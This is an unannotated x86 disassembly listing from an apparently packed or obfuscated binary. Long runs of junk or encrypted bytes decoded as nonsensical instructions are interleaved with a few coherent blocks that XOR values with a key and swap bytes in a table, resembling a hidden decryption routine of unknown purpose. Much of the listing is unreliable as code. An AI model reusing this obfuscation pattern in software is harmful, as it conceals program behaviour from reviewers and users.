  4049f7:	lock neg BYTE PTR [edx+0x6a69e4bd]
  4049fe:	call   0x7f9311e6
  404a03:	inc    ebx
  404a04:	push   es
  404a05:	pop    ds
  404a06:	mov    al,0xb3
  404a08:	fisttp DWORD PTR [edi-0x3a]
  404a0b:	xchg   edi,eax
  404a0c:	and    bh,BYTE PTR [eax]
  404a0e:	bound  ebp,QWORD PTR [edi+0xe7030fe]
  404a14:	jl     0x404a2d
  404a16:	jnp    0x404a79
  404a18:	xor    DWORD PTR [ecx],ebp
  404a1a:	ret    0xce81
  404a1d:	dec    esp
  404a1e:	jle    0x404a03
  404a20:	dec    ebp
  404a21:	cmp    DWORD PTR [edi],0x3
  404a24:	pusha  
  404a25:	aas    
  404a26:	push   eax
  404a27:	push   ds
  404a28:	repnz cwde 
  404a2a:	popf   
  404a2b:	jle    0x404a35
  404a2d:	test   BYTE PTR [ebp+0x5736e30f],al
  404a33:	(bad)  
  404a34:	mov    esi,0x6caa4dab
  404a39:	out    0x23,al
  404a3b:	int3   
  404a3c:	popf   
  404a3d:	les    edi,FWORD PTR [ecx]
  404a3f:	retf   0x8e2e
  404a42:	ins    BYTE PTR es:[edi],dx
  404a43:	sbb    ecx,eax
  404a45:	loop   0x404aa8
  404a47:	pusha  
  404a48:	outs   dx,BYTE PTR ds:[esi]
  404a49:	push   edx
  404a4a:	mov    eax,0x5a9a37e0
  404a4f:	pop    ebx
  404a50:	and    bl,cl
  404a52:	mov    dl,BYTE PTR [edi+0x14]
  404a55:	and    BYTE PTR [ebp-0x47283d58],al
  404a5b:	cld    
  404a5c:	test   BYTE PTR [eax-0x4],bl
  404a5f:	dec    ecx
  404a60:	mov    DWORD PTR ds:0x1c4ae687,edx
  404a66:	push   0xffffffab
  404a68:	and    DWORD PTR [ecx],0xffffffaa
  404a6b:	popf   
  404a6c:	cmp    eax,0x2092bd61
  404a71:	mov    cl,0x34
  404a73:	and    al,0xe2
  404a75:	fsubr  QWORD PTR [edi+0x753b2f94]
  404a7b:	dec    esp
  404a7c:	and    BYTE PTR ds:0x97c916e0,ah
  404a82:	dec    esp
  404a83:	test   eax,0xecbdcb50
  404a88:	leave  
  404a89:	pop    edx
  404a8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a8b:	and    cl,BYTE PTR [ebx+eiz*8]
  404a8e:	lahf   
  404a8f:	push   esp
  404a90:	cmp    esp,DWORD PTR [edx+0xe]
  404a93:	jge    0x404a8b
  404a95:	or     eax,0xee1907b2
  404a9a:	outs   dx,DWORD PTR ds:[esi]
  404a9b:	arpl   WORD PTR [esi+0x4948ec91],cx
  404aa1:	(bad)  
  404aa2:	retf   
  404aa3:	mov    ch,0xde
  404aa5:	or     bh,al
  404aa7:	inc    ebp
  404aa8:	hlt    
  404aa9:	xor    al,BYTE PTR [ebp+0x45c7f89c]
  404aaf:	mov    esp,0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0x503c6a28
  404b32:	mov    dh,0x54
  404b34:	xor    eax,0x7e7e22a2
  404b39:	pop    eax
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b7b
  404b3e:	ret    0x9157
  404b41:	scas   al,BYTE PTR es:[edi]
  404b42:	dec    edi
  404b43:	xchg   DWORD PTR [ebp-0x30e21f92],edx
  404b49:	hlt    
  404b4a:	out    0xbe,eax
  404b4c:	lgs    esp,FWORD PTR [edx+0x288336e2]
  404b53:	add    edx,DWORD PTR ds:0x4148928c
  404b59:	out    dx,al
  404b5a:	add    dl,bh
  404b5c:	jnp    0x404bb2
  404b5e:	add    ebx,esi
  404b60:	dec    esp
  404b61:	adc    eax,0x6dba4210
  404b66:	and    DWORD PTR [ebx],0x917d74be
  404b6c:	(bad)  
  404b6d:	and    edx,ebx
  404b6f:	sbb    DWORD PTR [ecx+0x7feb88c7],esi
  404b75:	inc    esi
  404b76:	add    al,0xe5
  404b78:	pop    ebp
  404b79:	mov    bl,0xee
  404b7b:	jne    0x404bb8
  404b7d:	inc    ebx
  404b7e:	in     eax,0x3e
  404b80:	lea    eax,[ecx+ebp*8-0x8]
  404b84:	outs   dx,DWORD PTR ds:[esi]
  404b85:	or     eax,0x4fef05ca
  404b8a:	and    cl,al
  404b8c:	xchg   edi,eax
  404b8d:	stos   DWORD PTR es:[edi],eax
  404b8e:	push   edx
  404b8f:	mov    edx,0xc7a27591
  404b94:	jecxz  0x404bb7
  404b96:	hlt    
  404b97:	add    BYTE PTR [eax+0x7b6a500],bh
  404b9d:	xchg   ecx,eax
  404b9e:	add    dh,BYTE PTR [ecx-0x4b]
  404ba1:	jmp    0x404bd0
  404ba3:	sub    BYTE PTR [eax+0x19],bh
  404ba6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ba7:	cs int3 
  404ba9:	xchg   DWORD PTR [esi],edi
  404bab:	arpl   WORD PTR [edi+eax*1+0x3ee063ec],dx
  404bb2:	mov    dl,0x71
  404bb4:	jl     0x404b3a
  404bb6:	jbe    0x404b66
  404bb8:	icebp  
  404bb9:	sub    al,0xba
  404bbb:	mov    eax,0xbe527efe
  404bc0:	xor    BYTE PTR [eax-0xe],bh
  404bc3:	adc    al,0x49
  404bc5:	push   esp
  404bc6:	push   esi
  404bc7:	push   eax
  404bc8:	sar    DWORD PTR [ebp+eax*1+0x7f],1
  404bcc:	cdq    
  404bcd:	dec    edi
  404bce:	jae    0x404bb5
  404bd0:	push   edi
  404bd1:	mov    ch,0xac
  404bd3:	jg     0x404bc1
  404bd5:	dec    esi
  404bd6:	lods   al,BYTE PTR ds:[esi]
  404bd7:	mov    WORD PTR [ebp+0x52bea01a],es
  404bdd:	in     al,0xab
  404bdf:	and    ecx,eax
  404be1:	xor    esp,ebp
  404be3:	les    ebp,FWORD PTR [ecx]
  404be5:	mov    ah,0x51
  404be7:	add    dl,BYTE PTR [edi]
  404be9:	dec    ebx
  404bea:	pop    ebp
  404beb:	popa   
  404bec:	push   es
  404bed:	syscall 
  404bef:	popa   
  404bf0:	cmp    BYTE PTR [eax+eiz*2],bl
  404bf3:	and    al,0xbb
  404bf5:	lods   al,BYTE PTR ds:[esi]
  404bf6:	cld    
  404bf7:	shr    DWORD PTR [esi-0x75],1
  404bfa:	dec    esi
  404bfb:	adc    cl,BYTE PTR [eax+esi*8+0x51b66dec]
  404c02:	or     DWORD PTR [ebx],0xe
  404c05:	icebp  
  404c06:	je     0x404b8d
  404c08:	sbb    DWORD PTR [esp+esi*4-0x78],esp
  404c0c:	mov    bh,0xd7
  404c0e:	pop    ds
  404c0f:	stos   BYTE PTR es:[edi],al
  404c10:	aam    0x95
  404c12:	es nop
  404c14:	imul   edi,ebx,0x485ffa3a
  404c1a:	jbe    0x404c51
  404c1c:	xchg   ebp,eax
  404c1d:	stc    
  404c1e:	bnd jo 0x404c30
  404c21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c22:	mov    esp,0x8354eb51
  404c27:	mov    bl,0x4
  404c29:	popa   
  404c2a:	in     al,dx
  404c2b:	popa   
  404c2c:	push   edi
  404c2d:	je     0x404c37
  404c2f:	jmp    0xdf4fba2c
  404c34:	repz push 0x2a
  404c37:	push   cs
  404c38:	mov    eax,0x8f49d473
  404c3d:	js     0x404bca
  404c3f:	push   ecx
  404c40:	dec    BYTE PTR [esi]
  404c42:	inc    esi
  404c43:	fisub  DWORD PTR [ecx+0x2]
  404c46:	rcr    ebp,0xef
  404c49:	jb     0x404c8d
  404c4b:	out    0x3,al
  404c4d:	iret   
  404c4e:	ss sbb eax,0xf1e46721
  404c54:	pminsw mm4,QWORD PTR [eax]
  404c57:	jmp    0x404caf
  404c59:	xor    BYTE PTR [edi-0x7a1b8cdd],bh
  404c5f:	daa    
  404c60:	push   edx
  404c61:	and    eax,0x63c3fee6
  404c66:	retf   
  404c67:	in     eax,0x9
  404c69:	leave  
  404c6a:	int    0x52
  404c6c:	cmp    al,al
  404c6e:	mov    DWORD PTR [edi*4+0x902a877],ecx
  404c75:	push   ds
  404c76:	fmul   DWORD PTR [edi+esi*4+0x3a]
  404c7a:	dec    eax
  404c7b:	or     DWORD PTR [ecx],eax
  404c7d:	push   cs
  404c7e:	mov    cl,0x96
  404c80:	mov    dh,0xda
  404c82:	ins    DWORD PTR es:[edi],dx
  404c83:	xor    eax,0xd721f6bc
  404c88:	scas   eax,DWORD PTR es:[edi]
  404c89:	xor    eax,0x48b9b213
  404c8e:	sub    eax,0x5caadc61
  404c93:	jl     0x404c3b
  404c95:	push   eax
  404c96:	call   0x144f87a
  404c9b:	mov    ds:0xf422ab9a,al
  404ca0:	outs   dx,BYTE PTR ds:[esi]
  404ca1:	clc    
  404ca2:	mov    edi,0xbb9b1093
  404ca7:	mov    edi,0x5b7a98c3
  404cac:	mov    al,ds:0x5fa74ba1
  404cb1:	adc    eax,0x26955e79
  404cb6:	and    al,0x8a
  404cb8:	ds push 0xffffffac
  404cbb:	mov    bl,0xa4
  404cbd:	popa   
  404cbe:	test   BYTE PTR [edi],ah
  404cc0:	(bad)  
  404cc1:	sbb    al,0x9d
  404cc3:	and    DWORD PTR [esi-0x41],0x24
  404cc7:	mul    ah
  404cc9:	xchg   esi,eax
  404cca:	jmp    0x666:0x45a734d7
  404cd1:	cmc    
  404cd2:	pop    edx
  404cd3:	jg     0x404c8f
  404cd5:	mov    eax,0x6a63e2f3
  404cda:	pop    ecx
  404cdb:	sbb    al,0xef
  404cdd:	lock jae 0x404d37
  404ce0:	mul    BYTE PTR [ebx-0x1e]
  404ce3:	xor    eax,ecx
  404ce5:	aas    
  404ce6:	loop   0x404c7f
  404ce8:	adc    al,BYTE PTR ds:0xd5b304d9
  404cee:	pop    edx
  404cef:	jae    0x404d0a
  404cf1:	loopne 0x404c8b
  404cf3:	retf   
  404cf4:	xchg   ebx,eax
  404cf5:	fadd   st(0),st
  404cf7:	mov    eax,ds:0x575ff0fc
  404cfc:	mov    edx,0xd6f8d732
  404d01:	fcomp  DWORD PTR [ebx-0x3c5a04d7]
  404d07:	test   BYTE PTR [edi],0x5d
  404d0a:	or     DWORD PTR [edx+0x69451265],edi
  404d10:	pop    sp
  404d12:	lods   al,BYTE PTR ds:[esi]
  404d13:	push   cs
  404d14:	mov    al,ds:0x9fdd043
  404d19:	stc    
  404d1a:	and    BYTE PTR [ebx-0x7a],ah
  404d1d:	inc    esp
  404d1e:	in     eax,dx
  404d1f:	hlt    
  404d20:	lock clc 
  404d22:	enter  0xea74,0x72
  404d26:	imul   ebx,DWORD PTR cs:[ecx+0x58d7bc23],0x4e
  404d2e:	push   0xe79f5bd1
  404d33:	mov    dl,0x6c
  404d35:	enter  0x30a3,0x62
  404d39:	rcl    BYTE PTR [ecx],1
  404d3b:	push   0xffffffa7
  404d3d:	jno    0x404d2e
  404d3f:	xor    eax,0xa6b59e45
  404d44:	sahf   
  404d45:	jno    0x404d7a
  404d47:	(bad)  
  404d48:	popf   
  404d49:	dec    edi
  404d4a:	xchg   DWORD PTR [eax+0x3b],esi
  404d4d:	or     dh,ah
  404d4f:	outs   dx,DWORD PTR ds:[esi]
  404d50:	mov    DWORD PTR [ebp-0x80],ecx
  404d53:	sbb    eax,0xe6f57008
  404d58:	or     bl,cl
  404d5a:	into   
  404d5b:	(bad)  
  404d5c:	hlt    
  404d5d:	stc    
  404d5e:	loop   0x404dd1
  404d60:	jb     0x404dbc
  404d62:	aad    0x59
  404d64:	push   esi
  404d65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d66:	cmp    esi,esp
  404d68:	ins    DWORD PTR es:[edi],dx
  404d69:	inc    ebp
  404d6a:	xchg   ebp,eax
  404d6b:	shl    BYTE PTR [ebp-0xd],0xcc
  404d6f:	jo     0x404d61
  404d71:	pop    ebp
  404d72:	dec    edi
  404d73:	rcl    esi,0x71
  404d76:	or     edx,ebx
  404d78:	hlt    
  404d79:	xchg   BYTE PTR [esi],dl
  404d7b:	fistp  WORD PTR gs:[edi-0x29776ac8]
  404d82:	mov    al,0xd9
  404d84:	mov    ecx,0x869c3a49
  404d89:	and    DWORD PTR [eax-0x64],esi
  404d8c:	cmp    cl,BYTE PTR [edi+0x4f]
  404d8f:	lods   al,BYTE PTR ds:[esi]
  404d90:	not    BYTE PTR ds:0x54b41feb
  404d96:	clc    
  404d97:	ret    0xc554
  404d9a:	add    eax,0xce2f4d32
  404d9f:	ja     0x404dc1
  404da1:	pop    ecx
  404da2:	pushf  
  404da3:	out    dx,eax
  404da4:	scas   eax,DWORD PTR es:[edi]
  404da5:	cwde   
  404da6:	jmp    0xc4de7039
  404dab:	adc    eax,0xdc46e693
  404db0:	mov    eax,0xd454a1fe
  404db5:	out    dx,eax
  404db6:	or     ebx,DWORD PTR [ebp-0x57a0d5ce]
  404dbc:	sub    ah,ch
  404dbe:	xchg   edi,eax
  404dbf:	inc    edi
  404dc0:	enter  0xabd6,0x3f
  404dc4:	cmp    DWORD PTR [eax+eiz*2-0x6a],edx
  404dc8:	out    dx,eax
  404dc9:	mov    ch,0xd0
  404dcb:	les    ebp,FWORD PTR [ebx-0x33]
  404dce:	xchg   BYTE PTR [esi+0x2943237a],bh
  404dd4:	cld    
  404dd5:	pusha  
  404dd6:	jmp    ebx
  404dd8:	outs   dx,BYTE PTR ds:[esi]
  404dd9:	xor    ebp,DWORD PTR [ebp-0x80]
  404ddc:	push   cs
  404ddd:	xchg   ebp,eax
  404dde:	mov    ds,WORD PTR [edx]
  404de0:	int    0x52
  404de2:	ss call 0x8078:0x9f5acfd0
  404dea:	pusha  
  404deb:	or     BYTE PTR [ecx-0x177295c2],bh
  404df1:	(bad)  [eax]
  404df3:	jbe    0x404d8e
  404df5:	mov    ds:0xb77cef48,al
  404dfa:	out    0xe9,eax
  404dfc:	not    ebx
  404dfe:	out    dx,eax
  404dff:	clc    
  404e00:	sub    bl,BYTE PTR [eax]
  404e02:	mov    dh,0x8a
  404e04:	mov    WORD PTR [edi],?
  404e06:	lods   al,BYTE PTR ds:[esi]
  404e07:	aas    
  404e08:	popf   
  404e09:	je     0x404e17
  404e0b:	mov    ebp,0xce83ccd8
  404e10:	ret    0x8f2c
  404e13:	jnp    0x404da0
  404e15:	adc    bl,bh
  404e17:	and    eax,ebp
  404e19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e1a:	pop    edi
  404e1b:	scas   al,BYTE PTR es:[edi]
  404e1c:	out    dx,al
  404e1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e1e:	push   esi
  404e1f:	outs   dx,BYTE PTR ds:[esi]
  404e20:	fadd   QWORD PTR [ecx]
  404e22:	pop    ss
  404e23:	add    edi,ecx
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404ed7
  404e5e:	mov    bl,0xef
  404e60:	sbb    ecx,DWORD PTR [ecx+eiz*1+0x7c587e7e]
  404e67:	jle    0x404ee7
  404e69:	aas    
  404e6a:	in     eax,dx
  404e6b:	ret    0x2a
  404e6e:	pop    edi
  404e6f:	jo     0x404ec1
  404e71:	lea    edx,[edi]
  404e73:	lods   al,BYTE PTR ds:[esi]
  404e74:	iret   
  404e75:	xor    BYTE PTR [esi-0x2e1910bf],dl
  404e7b:	sahf   
  404e7c:	sbb    BYTE PTR [edi],bh
  404e7e:	jnp    0x404e90
  404e80:	xor    DWORD PTR ds:0xf80ade5f,esp
  404e86:	repz fcomp QWORD PTR [ecx+0x563fd7b2]
  404e8d:	or     dh,BYTE PTR ds:0x642acd6c
  404e93:	bound  eax,QWORD PTR [edx+0x1bc91cf8]
  404e99:	fimul  DWORD PTR [esi+0x6149d2f8]
  404e9f:	mov    edi,?
  404ea1:	out    dx,al
  404ea2:	mov    esp,0xa1247ad8
  404ea7:	jecxz  0x404e9d
  404ea9:	(bad)  
  404eaa:	cmp    bh,dl
  404eac:	out    0xa3,eax
  404eae:	mov    ebp,0x12d969a9
  404eb3:	fnstsw WORD PTR [edi]
  404eb5:	mov    edi,0x8ef30a
  404eba:	retf   0x9759
  404ebd:	ret    0x6bca
  404ec0:	(bad)  
  404ec1:	cs xchg esi,eax
  404ec3:	addr16 shl ah,cl
  404ec6:	adc    ah,ah
  404ec8:	cmp    cl,BYTE PTR [eax-0x4d9ecfbe]
  404ece:	push   eax
  404ecf:	inc    ecx
  404ed0:	aad    0x53
  404ed2:	push   es
  404ed3:	mov    dl,0x12
  404ed5:	fwait
  404ed6:	mov    al,0x7b
  404ed8:	push   esi
  404ed9:	sub    eax,0xb8123d98
  404ede:	or     al,0x7a
  404ee0:	inc    ebp
  404ee2:	ss jb  0x404ebd
  404ee5:	add    DWORD PTR [esi+0x4],ebp
  404ee8:	push   edi
  404ee9:	shl    DWORD PTR [ebx+esi*8+0x1c45e58c],cl
  404ef0:	pop    es
  404ef1:	imul   esi,DWORD PTR [edi],0xffffffb7
  404ef4:	pop    ecx
  404ef5:	push   esi
  404ef7:	das    
  404ef8:	mov    bl,0x13
  404efa:	sbb    BYTE PTR [edi-0x2171d4c7],dh
  404f00:	sbb    al,al
  404f02:	shl    BYTE PTR [ecx-0x77],1
  404f05:	ins    BYTE PTR es:[edi],dx
  404f06:	jo     0x404f58
  404f08:	mov    ds:0xc48081f4,eax
  404f0d:	out    dx,al
  404f0e:	jmp    0x60ba:0xd2ea82f1
  404f15:	sub    dl,BYTE PTR [ecx-0x7b]
  404f18:	fisttp QWORD PTR [eax+0x7b9852d4]
  404f1e:	xor    al,0xa2
  404f20:	xor    al,0x21
  404f22:	or     al,0x7b
  404f24:	add    eax,0x5f028438
  404f29:	xchg   DWORD PTR [esi+0x2d0e0a14],ebx
  404f2f:	ror    BYTE PTR ds:0x89ea5266,1
  404f35:	mov    cl,0x29
  404f37:	jecxz  0x404f6d
  404f39:	js     0x404f28
  404f3b:	aas    
  404f3c:	fmul   st,st(3)
  404f3e:	adc    al,0xa8
  404f40:	inc    edx
  404f41:	retf   
  404f42:	scas   eax,DWORD PTR es:[edi]
  404f43:	jo     0x404f11
  404f45:	inc    edi
  404f46:	jno    0x404f08
  404f48:	test   eax,0xcd6c9197
  404f4d:	mov    bh,0x5a
  404f4f:	popf   
  404f50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f51:	inc    esi
  404f52:	iret   
  404f53:	neg    ch
  404f55:	je     0x404f17
  404f57:	push   0x7e5e112a
  404f5c:	pop    eax
  404f5d:	inc    edx
  404f5e:	sbb    eax,0x3587f037
  404f63:	ds dec esp
  404f65:	adc    al,0xdf
  404f67:	in     eax,dx
  404f68:	pop    eax
  404f69:	call   0xad4ba1f0
  404f6e:	mov    esi,0x12cbeed4
  404f73:	xor    DWORD PTR [esi-0x1bb43529],ebp
  404f79:	inc    edx
  404f7a:	cwde   
  404f7b:	clc    
  404f7c:	sti    
  404f7d:	cli    
  404f7e:	dec    esp
  404f7f:	inc    edi
  404f80:	jbe    0x404ffd
  404f82:	mov    ds:0x1020283b,eax
  404f87:	xor    eax,0xa76b7909
  404f8c:	cmc    
  404f8d:	adc    BYTE PTR [edi+0x6599510],ch
  404f93:	dec    ecx
  404f94:	pop    edx
  404f95:	scas   eax,DWORD PTR es:[edi]
  404f96:	push   esp
  404f97:	std    
  404f98:	ins    DWORD PTR es:[edi],dx
  404f99:	fdiv   QWORD PTR [edx+ebx*8]
  404f9c:	mov    BYTE PTR [eax],dh
  404f9e:	clc    
  404f9f:	fnstcw WORD PTR [edi]
  404fa1:	adc    esi,DWORD PTR [eax-0x56b3fe49]
  404fa7:	inc    ecx
  404fa8:	fwait
  404fa9:	dec    eax
  404faa:	int    0x6
  404fac:	cmp    BYTE PTR [esi-0x2f],al
  404faf:	push   ds
  404fb0:	cmp    DWORD PTR [edx-0x3c2343d2],0x7c
  404fb7:	pop    edx
  404fb8:	jnp    0x404ff9
  404fba:	fs es jmp 0x405019
  404fbe:	cmc    
  404fbf:	ds pop ebx
  404fc1:	js     0x40503b
  404fc3:	xlat   BYTE PTR ds:[ebx]
  404fc4:	out    dx,eax
  404fc5:	xor    DWORD PTR [esi],0xffffff81
  404fc8:	outs   dx,DWORD PTR ds:[esi]
  404fc9:	mov    dl,0xf5
  404fcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fcc:	jb     0x405039
  404fce:	mov    dl,0x7c
  404fd0:	sub    eax,0xf3e73c8e
  404fd5:	mov    BYTE PTR [eax],ah
  404fd7:	push   cs
  404fd8:	scas   al,BYTE PTR es:[edi]
  404fd9:	ss jo  0x404f5d
  404fdc:	xor    bh,dl
  404fde:	test   eax,0xdf49fb91
  404fe3:	push   esi
  404fe4:	aas    
  404fe5:	nop
  404fe6:	inc    ebp
  404fe7:	jmp    0xb606:0x87566b30
  404fee:	push   es
  404fef:	sahf   
  404ff0:	pop    ebx
  404ff1:	pop    edi
  404ff2:	sbb    eax,0xf8059cf2
  404ff7:	mov    fs,WORD PTR [edi-0x2a]
  404ffa:	test   DWORD PTR [ebx+0xc],ecx
  404ffd:	sub    cl,BYTE PTR [ebp-0x2e]
  405000:	xchg   ecx,eax
  405001:	out    0xbe,al
  405003:	mov    DWORD PTR [eax],ecx
  405005:	std    
  405006:	push   ebp
  405007:	pop    ebx
  405008:	inc    edi
  405009:	retf   
  40500a:	inc    esp
  40500b:	mov    es,WORD PTR [ebp-0xaf62e36]
  405011:	sub    BYTE PTR [ecx+0x7812e4d8],cl
  405017:	and    edx,ebp
  405019:	lea    esp,[ebx]
  40501b:	push   ebx
  40501c:	ja     0x405050
  40501e:	fisttp WORD PTR [edi+0x58]
  405021:	inc    ebx
  405022:	aaa    
  405023:	jno    0x405045
  405025:	cld    
  405026:	push   eax
  405027:	fdivr  DWORD PTR [ecx-0xda30da]
  40502d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40502e:	pop    es
  40502f:	sub    al,0x3
  405031:	ret    0x570f
  405034:	int    0xf0
  405036:	arpl   bp,dx
  405038:	inc    ebp
  405039:	daa    
  40503a:	ins    DWORD PTR es:[edi],dx
  40503b:	xchg   ebx,eax
  40503c:	(bad)  
  40503d:	cmp    ch,BYTE PTR [esi+ebp*4+0x9]
  405041:	adc    al,0xf9
  405043:	cmp    BYTE PTR [edi+ebx*4+0x6f14f36c],ah
  40504a:	retf   
  40504b:	cmp    eax,DWORD PTR [ebx+0x1a]
  40504e:	jo     0x405062
  405050:	cmp    DWORD PTR [eax-0x5c5f1d46],esp
  405056:	xor    ecx,edi
  405058:	xchg   BYTE PTR [ebp-0x69598115],bl
  40505e:	repnz pop ebp
  405060:	cmc    
  405061:	mov    edi,0xe494f903
  405066:	add    al,BYTE PTR [ecx]
  405068:	cmc    
  405069:	cmp    DWORD PTR [eax+ebx*1+0xa210141],0xba85989d
  405074:	rol    esi,0xd7
  405077:	les    edi,FWORD PTR [eax+0x6b]
  40507a:	add    edi,DWORD PTR [ebx+0x271be104]
  405080:	sub    al,0x48
  405082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405083:	sub    BYTE PTR [edi-0x7108e34b],ch
  405089:	(bad)  
  40508b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40508c:	mov    sp,0x4010
  405090:	mov    WORD PTR [esi-0x517058b9],ss
  405096:	pop    esp
  405097:	stos   BYTE PTR es:[edi],al
  405098:	fidiv  WORD PTR [edi]
  40509a:	dec    edx
  40509b:	popa   
  40509c:	jno    0x4050ef
  40509e:	cmp    BYTE PTR [edi-0x75],bh
  4050a1:	jns    0x405071
  4050a3:	(bad)  
  4050a4:	cld    
  4050a5:	add    DWORD PTR [edx-0x75816a61],edx
  4050ab:	sbb    ebp,esi
  4050ad:	push   cs
  4050ae:	sbb    al,BYTE PTR [edx-0x758cfa34]
  4050b4:	or     bl,BYTE PTR [edx+0x42cd8290]
  4050ba:	jge    0x405068
  4050bc:	addr16 out dx,eax
  4050be:	(bad)  
  4050bf:	daa    
  4050c0:	mov    ebx,0xac98e12c
  4050c5:	pop    eax
  4050c6:	sbb    bl,0x16
  4050c9:	jbe    0x405113
  4050cb:	enter  0xe2fe,0x61
  4050cf:	(bad)  
  4050d0:	(bad)  
  4050d2:	mov    al,ds:0x12f42e6
  4050d7:	jl     0x40514c
  4050d9:	push   esi
  4050da:	sbb    BYTE PTR [eax-0x7d97dad5],ch
  4050e0:	dec    esi
  4050e1:	cs dec ebp
  4050e3:	or     eax,0x612084fb
  4050e8:	mov    al,0x21
  4050ea:	xchg   ebx,eax
  4050eb:	pop    esp
  4050ec:	mov    ds:0xf6222ba2,al
  4050f1:	and    BYTE PTR [ecx],bl
  4050f3:	lds    edi,FWORD PTR [eax]
  4050f5:	and    al,0x8f
  4050f7:	jno    0x405130
  4050f9:	jg     0x405141
  4050fb:	jo     0x405093
  4050fd:	jg     0x40510e
  4050ff:	cmp    DWORD PTR [eax-0x30],0x9660130a
  405106:	mov    es,WORD PTR [edx]
  405108:	sub    DWORD PTR [ebp+0x2],0x9c02d29b
  40510f:	cmp    ebp,0xda114e3
  405115:	sbb    esi,esi
  405117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405118:	mov    ds:0xbedfa76f,al
  40511d:	repz sub eax,0xad3986d2
  405123:	or     eax,0x1442d193
  405128:	sub    esp,DWORD PTR ds:0xbe6cb6f7
  40512e:	inc    eax
  40512f:	sbb    ecx,eax
  405131:	cmp    DWORD PTR [esi],ebx
  405133:	pop    eax
  405134:	and    DWORD PTR [eax+eax*2-0x77851da4],esi
  40513b:	pusha  
  40513c:	adc    al,0xb0
  40513e:	mov    ah,0xfc
  405140:	mov    eax,?
  405142:	or     DWORD PTR [ecx],ecx
  405144:	jmp    0x340e9c35
  405149:	mov    ds:0xf4ee5c36,eax
  40514e:	inc    esi
  40514f:	imul   edi,ebx
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	(bad)  
  405172:	sti    
  405173:	scas   eax,DWORD PTR es:[edi]
  405174:	mov    esi,esi
  405176:	sub    al,0x7e
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x405141
  40517e:	cmp    al,0xe6
  405180:	pop    ss
  405181:	(bad)  
  405183:	pop    edx
  405184:	cpuid  
  405186:	xor    esi,DWORD PTR [ebp-0x32187e6c]
  40518c:	shl    DWORD PTR [edi-0x2a],cl
  40518f:	out    0xaa,al
  405191:	out    0x7a,al
  405193:	mov    ebp,0xc874dbcb
  405198:	jne    0x4051a6
  40519a:	pop    eax
  40519b:	lahf   
  40519c:	sbb    BYTE PTR [esi+ebp*4-0x10de42b1],0xb4
  4051a4:	push   0xffffffd5
  4051a6:	xlat   BYTE PTR ds:[ebx]
  4051a7:	pop    esi
  4051a8:	stos   DWORD PTR es:[edi],eax
  4051a9:	jae    0x40520e
  4051ab:	sar    DWORD PTR [ebx],cl
